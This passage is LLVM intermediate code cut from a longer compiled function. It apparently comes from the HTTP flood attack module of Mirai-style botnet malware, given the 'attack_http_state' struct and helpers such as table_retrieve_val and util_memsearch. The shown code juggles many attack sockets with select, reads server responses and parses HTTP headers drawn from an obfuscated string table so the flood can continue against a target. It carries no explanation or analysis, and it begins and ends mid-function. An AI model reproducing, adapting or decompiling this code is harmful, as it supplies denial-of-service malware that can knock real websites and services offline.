  %867 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %866, i32 0, i32 0
  %868 = load i32, i32* %867, align 4
  %869 = srem i32 %868, 64
  %870 = zext i32 %869 to i64
  %871 = shl i64 1, %870
  %872 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %873 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %874 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %873, i32 0, i32 0
  %875 = load i32, i32* %874, align 4
  %876 = sdiv i32 %875, 64
  %877 = sext i32 %876 to i64
  %878 = getelementptr inbounds [16 x i64], [16 x i64]* %872, i64 0, i64 %877
  %879 = load i64, i64* %878, align 8
  %880 = or i64 %879, %871
  store i64 %880, i64* %878, align 8
  %881 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %882 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %881, i32 0, i32 0
  %883 = load i32, i32* %882, align 4
  %884 = load i32, i32* %23, align 4
  %885 = icmp sgt i32 %883, %884
  br i1 %885, label %886, label %891

886:                                              ; preds = %865
  %887 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %888 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %887, i32 0, i32 0
  %889 = load i32, i32* %888, align 4
  %890 = add nsw i32 %889, 1
  store i32 %890, i32* %23, align 4
  br label %891

891:                                              ; preds = %886, %865
  br label %951

892:                                              ; preds = %859
  %893 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %894 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %893, i32 0, i32 1
  %895 = load i8, i8* %894, align 4
  %896 = zext i8 %895 to i32
  %897 = icmp eq i32 %896, 10
  br i1 %897, label %898, label %925

898:                                              ; preds = %892
  %899 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %900 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %899, i32 0, i32 0
  %901 = load i32, i32* %900, align 4
  %902 = srem i32 %901, 64
  %903 = zext i32 %902 to i64
  %904 = shl i64 1, %903
  %905 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %906 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %907 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %906, i32 0, i32 0
  %908 = load i32, i32* %907, align 4
  %909 = sdiv i32 %908, 64
  %910 = sext i32 %909 to i64
  %911 = getelementptr inbounds [16 x i64], [16 x i64]* %905, i64 0, i64 %910
  %912 = load i64, i64* %911, align 8
  %913 = or i64 %912, %904
  store i64 %913, i64* %911, align 8
  %914 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %914, i32 0, i32 0
  %916 = load i32, i32* %915, align 4
  %917 = load i32, i32* %23, align 4
  %918 = icmp sgt i32 %916, %917
  br i1 %918, label %919, label %924

919:                                              ; preds = %898
  %920 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %921 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %920, i32 0, i32 0
  %922 = load i32, i32* %921, align 4
  %923 = add nsw i32 %922, 1
  store i32 %923, i32* %23, align 4
  br label %924

924:                                              ; preds = %919, %898
  br label %950

925:                                              ; preds = %892
  %926 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %927 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %926, i32 0, i32 1
  %928 = load i8, i8* %927, align 4
  %929 = zext i8 %928 to i32
  %930 = icmp eq i32 %929, 11
  br i1 %930, label %931, label %940

931:                                              ; preds = %925
  %932 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %933 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %932, i32 0, i32 1
  store i8 0, i8* %933, align 4
  %934 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %935 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %934, i32 0, i32 0
  %936 = load i32, i32* %935, align 4
  %937 = call i32 @close(i32 noundef %936)
  %938 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %939 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %938, i32 0, i32 0
  store i32 -1, i32* %939, align 4
  br label %949

940:                                              ; preds = %925
  %941 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %941, i32 0, i32 1
  store i8 0, i8* %942, align 4
  %943 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %944 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %943, i32 0, i32 0
  %945 = load i32, i32* %944, align 4
  %946 = call i32 @close(i32 noundef %945)
  %947 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %948 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %947, i32 0, i32 0
  store i32 -1, i32* %948, align 4
  br label %949

949:                                              ; preds = %940, %931
  br label %950

950:                                              ; preds = %949, %924
  br label %951

951:                                              ; preds = %950, %891
  br label %952

952:                                              ; preds = %951, %858
  br label %953

953:                                              ; preds = %952, %825
  br label %954

954:                                              ; preds = %953, %545
  br label %955

955:                                              ; preds = %954, %496
  br label %956

956:                                              ; preds = %955, %510, %433
  %957 = load i32, i32* %9, align 4
  %958 = add nsw i32 %957, 1
  store i32 %958, i32* %9, align 4
  br label %385, !llvm.loop !12

959:                                              ; preds = %385
  %960 = load i32, i32* %23, align 4
  %961 = icmp eq i32 %960, 0
  br i1 %961, label %962, label %963

962:                                              ; preds = %959
  br label %350

963:                                              ; preds = %959
  %964 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %964, align 8
  %965 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %965, align 8
  %966 = load i32, i32* %23, align 4
  %967 = call i32 @select(i32 noundef %966, %struct.fd_set* noundef %21, %struct.fd_set* noundef %22, %struct.fd_set* noundef null, %struct.timeval* noundef %25)
  store i32 %967, i32* %24, align 4
  %968 = call i64 @time(i64* noundef null) #6
  %969 = trunc i64 %968 to i32
  store i32 %969, i32* %27, align 4
  %970 = load i32, i32* %24, align 4
  %971 = icmp slt i32 %970, 1
  br i1 %971, label %972, label %973

972:                                              ; preds = %963
  br label %350

973:                                              ; preds = %963
  store i32 0, i32* %9, align 4
  br label %974

974:                                              ; preds = %2453, %973
  %975 = load i32, i32* %9, align 4
  %976 = load i32, i32* %18, align 4
  %977 = icmp slt i32 %975, %976
  br i1 %977, label %978, label %2456

978:                                              ; preds = %974
  %979 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %980 = load i32, i32* %9, align 4
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %979, i64 %981
  store %struct.attack_http_state* %982, %struct.attack_http_state** %26, align 8
  %983 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %984 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %983, i32 0, i32 0
  %985 = load i32, i32* %984, align 4
  %986 = icmp eq i32 %985, -1
  br i1 %986, label %987, label %988

987:                                              ; preds = %978
  br label %2453

988:                                              ; preds = %978
  %989 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %990 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %991 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %990, i32 0, i32 0
  %992 = load i32, i32* %991, align 4
  %993 = sdiv i32 %992, 64
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds [16 x i64], [16 x i64]* %989, i64 0, i64 %994
  %996 = load i64, i64* %995, align 8
  %997 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %998 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %997, i32 0, i32 0
  %999 = load i32, i32* %998, align 4
  %1000 = srem i32 %999, 64
  %1001 = zext i32 %1000 to i64
  %1002 = shl i64 1, %1001
  %1003 = and i64 %996, %1002
  %1004 = icmp ne i64 %1003, 0
  br i1 %1004, label %1005, label %1029

1005:                                             ; preds = %988
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1006 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1007 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1006, i32 0, i32 0
  %1008 = load i32, i32* %1007, align 4
  %1009 = bitcast i32* %35 to i8*
  %1010 = call i32 @getsockopt(i32 noundef %1008, i32 noundef 1, i32 noundef 4, i8* noundef %1009, i32* noundef %36) #6
  store i32 %1010, i32* %12, align 4
  %1011 = load i32, i32* %35, align 4
  %1012 = icmp eq i32 %1011, 0
  br i1 %1012, label %1013, label %1019

1013:                                             ; preds = %1005
  %1014 = load i32, i32* %12, align 4
  %1015 = icmp eq i32 %1014, 0
  br i1 %1015, label %1016, label %1019

1016:                                             ; preds = %1013
  %1017 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1018 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1017, i32 0, i32 1
  store i8 4, i8* %1018, align 4
  br label %1028

1019:                                             ; preds = %1013, %1005
  %1020 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1021 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1020, i32 0, i32 0
  %1022 = load i32, i32* %1021, align 4
  %1023 = call i32 @close(i32 noundef %1022)
  %1024 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1025 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1024, i32 0, i32 0
  store i32 -1, i32* %1025, align 4
  %1026 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1027 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1026, i32 0, i32 1
  store i8 0, i8* %1027, align 4
  br label %2453

1028:                                             ; preds = %1016
  br label %1029

1029:                                             ; preds = %1028, %988
  %1030 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1031, i32 0, i32 0
  %1033 = load i32, i32* %1032, align 4
  %1034 = sdiv i32 %1033, 64
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds [16 x i64], [16 x i64]* %1030, i64 0, i64 %1035
  %1037 = load i64, i64* %1036, align 8
  %1038 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1039 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1038, i32 0, i32 0
  %1040 = load i32, i32* %1039, align 4
  %1041 = srem i32 %1040, 64
  %1042 = zext i32 %1041 to i64
  %1043 = shl i64 1, %1042
  %1044 = and i64 %1037, %1043
  %1045 = icmp ne i64 %1044, 0
  br i1 %1045, label %1046, label %2452

1046:                                             ; preds = %1029
  %1047 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1048 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1047, i32 0, i32 1
  %1049 = load i8, i8* %1048, align 4
  %1050 = zext i8 %1049 to i32
  %1051 = icmp eq i32 %1050, 6
  br i1 %1051, label %1052, label %2015

1052:                                             ; preds = %1046
  store i32 0, i32* %37, align 4
  %1053 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  call void @util_zero(i8* noundef %1053, i32 noundef 10240)
  %1054 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1055 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1054, i32 0, i32 0
  %1056 = load i32, i32* %1055, align 4
  %1057 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1058 = call i64 @recv(i32 noundef %1056, i8* noundef %1057, i64 noundef 10240, i32 noundef 16386)
  %1059 = trunc i64 %1058 to i32
  store i32 %1059, i32* %12, align 4
  %1060 = icmp slt i32 %1059, 1
  br i1 %1060, label %1061, label %1070

1061:                                             ; preds = %1052
  %1062 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1063 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1062, i32 0, i32 0
  %1064 = load i32, i32* %1063, align 4
  %1065 = call i32 @close(i32 noundef %1064)
  %1066 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1067 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1066, i32 0, i32 0
  store i32 -1, i32* %1067, align 4
  %1068 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1069 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1068, i32 0, i32 1
  store i8 0, i8* %1069, align 4
  br label %2453

1070:                                             ; preds = %1052
  %1071 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1072 = load i32, i32* %12, align 4
  %1073 = call i32 @util_memsearch(i8* noundef %1071, i32 noundef %1072, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 noundef 4)
  %1074 = icmp eq i32 %1073, -1
  br i1 %1074, label %1075, label %1079

1075:                                             ; preds = %1070
  %1076 = load i32, i32* %12, align 4
  %1077 = icmp slt i32 %1076, 10240
  br i1 %1077, label %1078, label %1079

1078:                                             ; preds = %1075
  br label %2453

1079:                                             ; preds = %1075, %1070
  %1080 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1081 = load i32, i32* %12, align 4
  %1082 = call i32 @util_memsearch(i8* noundef %1080, i32 noundef %1081, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 noundef 4)
  %1083 = sext i32 %1082 to i64
  %1084 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1083
  store i8 0, i8* %1084, align 1
  %1085 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1086 = load i32, i32* %12, align 4
  %1087 = call i8* @table_retrieve_val(i32 noundef 53, i32* noundef null)
  %1088 = call i32 @util_stristr(i8* noundef %1085, i32 noundef %1086, i8* noundef %1087)
  %1089 = icmp ne i32 %1088, -1
  br i1 %1089, label %1090, label %1093

1090:                                             ; preds = %1079
  %1091 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1092 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1091, i32 0, i32 11
  store i32 2, i32* %1092, align 4
  br label %1093

1093:                                             ; preds = %1090, %1079
  %1094 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1095 = load i32, i32* %12, align 4
  %1096 = call i8* @table_retrieve_val(i32 noundef 52, i32* noundef null)
  %1097 = call i32 @util_stristr(i8* noundef %1094, i32 noundef %1095, i8* noundef %1096)
  %1098 = icmp ne i32 %1097, -1
  br i1 %1098, label %1099, label %1102

1099:                                             ; preds = %1093
  %1100 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1101 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1100, i32 0, i32 11
  store i32 1, i32* %1101, align 4
  br label %1102

1102:                                             ; preds = %1099, %1093
  %1103 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1104 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1103, i32 0, i32 12
  store i32 0, i32* %1104, align 4
  %1105 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1106 = load i32, i32* %12, align 4
  %1107 = call i8* @table_retrieve_val(i32 noundef 51, i32* noundef null)
  %1108 = call i32 @util_stristr(i8* noundef %1105, i32 noundef %1106, i8* noundef %1107)
  %1109 = icmp ne i32 %1108, -1
  br i1 %1109, label %1110, label %1161

1110:                                             ; preds = %1102
  %1111 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1112 = load i32, i32* %12, align 4
  %1113 = call i8* @table_retrieve_val(i32 noundef 51, i32* noundef null)
  %1114 = call i32 @util_stristr(i8* noundef %1111, i32 noundef %1112, i8* noundef %1113)
  store i32 %1114, i32* %38, align 4
  %1115 = load i32, i32* %38, align 4
  %1116 = sext i32 %1115 to i64
  %1117 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1116
  %1118 = load i8, i8* %1117, align 1
  %1119 = sext i8 %1118 to i32
  %1120 = icmp eq i32 %1119, 32
  br i1 %1120, label %1121, label %1124

1121:                                             ; preds = %1110
  %1122 = load i32, i32* %38, align 4
  %1123 = add nsw i32 %1122, 1
  store i32 %1123, i32* %38, align 4
  br label %1124

1124:                                             ; preds = %1121, %1110
  %1125 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1126 = load i32, i32* %38, align 4
  %1127 = sext i32 %1126 to i64
  %1128 = getelementptr inbounds i8, i8* %1125, i64 %1127
  %1129 = load i32, i32* %12, align 4
  %1130 = load i32, i32* %38, align 4
  %1131 = sub nsw i32 %1129, %1130
  %1132 = call i32 @util_memsearch(i8* noundef %1128, i32 noundef %1131, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1132, i32* %39, align 4
  %1133 = load i32, i32* %39, align 4
  %1134 = icmp ne i32 %1133, -1
  br i1 %1134, label %1135, label %1160

1135:                                             ; preds = %1124
  %1136 = load i32, i32* %38, align 4
  %1137 = sext i32 %1136 to i64
  %1138 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1137
  store i8* %1138, i8** %40, align 8
  %1139 = load i32, i32* %39, align 4
  %1140 = icmp sge i32 %1139, 2
  br i1 %1140, label %1141, label %1144

1141:                                             ; preds = %1135
  %1142 = load i32, i32* %39, align 4
  %1143 = sub nsw i32 %1142, 2
  store i32 %1143, i32* %39, align 4
  br label %1144

1144:                                             ; preds = %1141, %1135
  %1145 = load i32, i32* %38, align 4
  %1146 = load i32, i32* %39, align 4
  %1147 = add nsw i32 %1145, %1146
  %1148 = sext i32 %1147 to i64
  %1149 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1148
  store i8 0, i8* %1149, align 1
  %1150 = load i8*, i8** %40, align 8
  %1151 = load i8*, i8** %40, align 8
  %1152 = call i32 @util_strlen(i8* noundef %1151)
  %1153 = call i8* @table_retrieve_val(i32 noundef 50, i32* noundef null)
  %1154 = call i32 @util_stristr(i8* noundef %1150, i32 noundef %1152, i8* noundef %1153)
  %1155 = icmp ne i32 %1154, 0
  br i1 %1155, label %1156, label %1159

1156:                                             ; preds = %1144
  %1157 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1157, i32 0, i32 12
  store i32 1, i32* %1158, align 4
  br label %1159

1159:                                             ; preds = %1156, %1144
  br label %1160

1160:                                             ; preds = %1159, %1124
  br label %1161

1161:                                             ; preds = %1160, %1102
  %1162 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1162, i32 0, i32 13
  store i32 0, i32* %1163, align 4
  %1164 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1165 = load i32, i32* %12, align 4
  %1166 = call i8* @table_retrieve_val(i32 noundef 48, i32* noundef null)
  %1167 = call i32 @util_stristr(i8* noundef %1164, i32 noundef %1165, i8* noundef %1166)
  %1168 = icmp ne i32 %1167, -1
  br i1 %1168, label %1169, label %1220

1169:                                             ; preds = %1161
  %1170 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1171 = load i32, i32* %12, align 4
  %1172 = call i8* @table_retrieve_val(i32 noundef 48, i32* noundef null)
  %1173 = call i32 @util_stristr(i8* noundef %1170, i32 noundef %1171, i8* noundef %1172)
  store i32 %1173, i32* %41, align 4
  %1174 = load i32, i32* %41, align 4
  %1175 = sext i32 %1174 to i64
  %1176 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1175
  %1177 = load i8, i8* %1176, align 1
  %1178 = sext i8 %1177 to i32
  %1179 = icmp eq i32 %1178, 32
  br i1 %1179, label %1180, label %1183

1180:                                             ; preds = %1169
  %1181 = load i32, i32* %41, align 4
  %1182 = add nsw i32 %1181, 1
  store i32 %1182, i32* %41, align 4
  br label %1183

1183:                                             ; preds = %1180, %1169
  %1184 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1185 = load i32, i32* %41, align 4
  %1186 = sext i32 %1185 to i64
  %1187 = getelementptr inbounds i8, i8* %1184, i64 %1186
  %1188 = load i32, i32* %12, align 4
  %1189 = load i32, i32* %41, align 4
  %1190 = sub nsw i32 %1188, %1189
  %1191 = call i32 @util_memsearch(i8* noundef %1187, i32 noundef %1190, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1191, i32* %42, align 4
  %1192 = load i32, i32* %42, align 4
  %1193 = icmp ne i32 %1192, -1
  br i1 %1193, label %1194, label %1219

1194:                                             ; preds = %1183
  %1195 = load i32, i32* %41, align 4
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1196
  store i8* %1197, i8** %43, align 8
  %1198 = load i32, i32* %42, align 4
  %1199 = icmp sge i32 %1198, 2
  br i1 %1199, label %1200, label %1203

1200:                                             ; preds = %1194
  %1201 = load i32, i32* %42, align 4
  %1202 = sub nsw i32 %1201, 2
  store i32 %1202, i32* %42, align 4
  br label %1203

1203:                                             ; preds = %1200, %1194
  %1204 = load i32, i32* %41, align 4
  %1205 = load i32, i32* %42, align 4
  %1206 = add nsw i32 %1204, %1205
  %1207 = sext i32 %1206 to i64
  %1208 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1207
  store i8 0, i8* %1208, align 1
  %1209 = load i8*, i8** %43, align 8
  %1210 = load i8*, i8** %43, align 8
  %1211 = call i32 @util_strlen(i8* noundef %1210)
  %1212 = call i8* @table_retrieve_val(i32 noundef 49, i32* noundef null)
  %1213 = call i32 @util_stristr(i8* noundef %1209, i32 noundef %1211, i8* noundef %1212)
  %1214 = icmp ne i32 %1213, 0
  br i1 %1214, label %1215, label %1218

1215:                                             ; preds = %1203
  %1216 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1217 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1216, i32 0, i32 13
  store i32 1, i32* %1217, align 4
  br label %1218

1218:                                             ; preds = %1215, %1203
  br label %1219

1219:                                             ; preds = %1218, %1183
  br label %1220

1220:                                             ; preds = %1219, %1161
  %1221 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1222 = load i32, i32* %12, align 4
  %1223 = call i8* @table_retrieve_val(i32 noundef 47, i32* noundef null)
  %1224 = call i32 @util_stristr(i8* noundef %1221, i32 noundef %1222, i8* noundef %1223)
  %1225 = icmp ne i32 %1224, -1
  br i1 %1225, label %1226, label %1271

1226:                                             ; preds = %1220
  %1227 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1228 = load i32, i32* %12, align 4
  %1229 = call i8* @table_retrieve_val(i32 noundef 47, i32* noundef null)
  %1230 = call i32 @util_stristr(i8* noundef %1227, i32 noundef %1228, i8* noundef %1229)
  store i32 %1230, i32* %44, align 4
  %1231 = load i32, i32* %44, align 4
  %1232 = sext i32 %1231 to i64
  %1233 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1232
  %1234 = load i8, i8* %1233, align 1
  %1235 = sext i8 %1234 to i32
  %1236 = icmp eq i32 %1235, 32
  br i1 %1236, label %1237, label %1240

1237:                                             ; preds = %1226
  %1238 = load i32, i32* %44, align 4
  %1239 = add nsw i32 %1238, 1
  store i32 %1239, i32* %44, align 4
  br label %1240

1240:                                             ; preds = %1237, %1226
  %1241 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1242 = load i32, i32* %44, align 4
  %1243 = sext i32 %1242 to i64
  %1244 = getelementptr inbounds i8, i8* %1241, i64 %1243
  %1245 = load i32, i32* %12, align 4
  %1246 = load i32, i32* %44, align 4
  %1247 = sub nsw i32 %1245, %1246
  %1248 = call i32 @util_memsearch(i8* noundef %1244, i32 noundef %1247, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1248, i32* %45, align 4
  %1249 = load i32, i32* %45, align 4
  %1250 = icmp ne i32 %1249, -1
  br i1 %1250, label %1251, label %1270

1251:                                             ; preds = %1240
  %1252 = load i32, i32* %44, align 4
  %1253 = sext i32 %1252 to i64
  %1254 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1253
  store i8* %1254, i8** %46, align 8
  %1255 = load i32, i32* %45, align 4
  %1256 = icmp sge i32 %1255, 2
  br i1 %1256, label %1257, label %1260

1257:                                             ; preds = %1251
  %1258 = load i32, i32* %45, align 4
  %1259 = sub nsw i32 %1258, 2
  store i32 %1259, i32* %45, align 4
  br label %1260

1260:                                             ; preds = %1257, %1251
  %1261 = load i32, i32* %44, align 4
  %1262 = load i32, i32* %45, align 4
  %1263 = add nsw i32 %1261, %1262
  %1264 = sext i32 %1263 to i64
  %1265 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1264
  store i8 0, i8* %1265, align 1
  %1266 = load i8*, i8** %46, align 8
  %1267 = call i32 @util_atoi(i8* noundef %1266, i32 noundef 10)
  %1268 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1269 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1268, i32 0, i32 14
  store i32 %1267, i32* %1269, align 4
  br label %1270

1270:                                             ; preds = %1260, %1240
  br label %1274

1271:                                             ; preds = %1220
  %1272 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1273 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1272, i32 0, i32 14
  store i32 0, i32* %1273, align 4
  br label %1274

1274:                                             ; preds = %1271, %1270
  store i32 0, i32* %37, align 4
  br label %1275

1275:                                             ; preds = %1450, %1274
  %1276 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1277 = load i32, i32* %37, align 4
  %1278 = sext i32 %1277 to i64
  %1279 = getelementptr inbounds i8, i8* %1276, i64 %1278
  %1280 = load i32, i32* %12, align 4
  %1281 = call i8* @table_retrieve_val(i32 noundef 46, i32* noundef null)
  %1282 = call i32 @util_stristr(i8* noundef %1279, i32 noundef %1280, i8* noundef %1281)
  %1283 = icmp ne i32 %1282, -1
  br i1 %1283, label %1284, label %1289

1284:                                             ; preds = %1275
  %1285 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1286 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1285, i32 0, i32 15
  %1287 = load i32, i32* %1286, align 4
  %1288 = icmp slt i32 %1287, 5
  br label %1289

1289:                                             ; preds = %1284, %1275
  %1290 = phi i1 [ false, %1275 ], [ %1288, %1284 ]
  br i1 %1290, label %1291, label %1454

1291:                                             ; preds = %1289
  %1292 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1293 = load i32, i32* %37, align 4
  %1294 = sext i32 %1293 to i64
  %1295 = getelementptr inbounds i8, i8* %1292, i64 %1294
  %1296 = load i32, i32* %12, align 4
  %1297 = call i8* @table_retrieve_val(i32 noundef 46, i32* noundef null)
  %1298 = call i32 @util_stristr(i8* noundef %1295, i32 noundef %1296, i8* noundef %1297)
  store i32 %1298, i32* %47, align 4
  %1299 = load i32, i32* %37, align 4
  %1300 = load i32, i32* %47, align 4
  %1301 = add nsw i32 %1299, %1300
  %1302 = sext i32 %1301 to i64
  %1303 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1302
  %1304 = load i8, i8* %1303, align 1
  %1305 = sext i8 %1304 to i32
  %1306 = icmp eq i32 %1305, 32
  br i1 %1306, label %1307, label %1310

1307:                                             ; preds = %1291
  %1308 = load i32, i32* %47, align 4
  %1309 = add nsw i32 %1308, 1
  store i32 %1309, i32* %47, align 4
  br label %1310

1310:                                             ; preds = %1307, %1291
  %1311 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 0
  %1312 = load i32, i32* %37, align 4
  %1313 = sext i32 %1312 to i64
  %1314 = getelementptr inbounds i8, i8* %1311, i64 %1313
  %1315 = load i32, i32* %47, align 4
  %1316 = sext i32 %1315 to i64
  %1317 = getelementptr inbounds i8, i8* %1314, i64 %1316
  %1318 = load i32, i32* %12, align 4
  %1319 = load i32, i32* %37, align 4
  %1320 = sub nsw i32 %1318, %1319
  %1321 = load i32, i32* %47, align 4
  %1322 = sub nsw i32 %1320, %1321
  %1323 = call i32 @util_memsearch(i8* noundef %1317, i32 noundef %1322, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 noundef 2)
  store i32 %1323, i32* %48, align 4
  %1324 = load i32, i32* %48, align 4
  %1325 = icmp ne i32 %1324, -1
  br i1 %1325, label %1326, label %1450

1326:                                             ; preds = %1310
